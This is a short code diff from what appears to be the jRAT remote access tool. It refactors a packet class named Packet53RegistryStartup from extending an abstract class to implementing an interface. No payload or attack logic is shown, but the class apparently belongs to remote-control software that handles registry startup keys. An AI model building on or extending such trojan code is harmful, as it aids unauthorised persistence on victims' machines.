@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet53RegistryStartup extends AbstractOutgoingPacket {
+public class Packet53RegistryStartup implements OutgoingPacket {
 
 	private String[] keys;
 
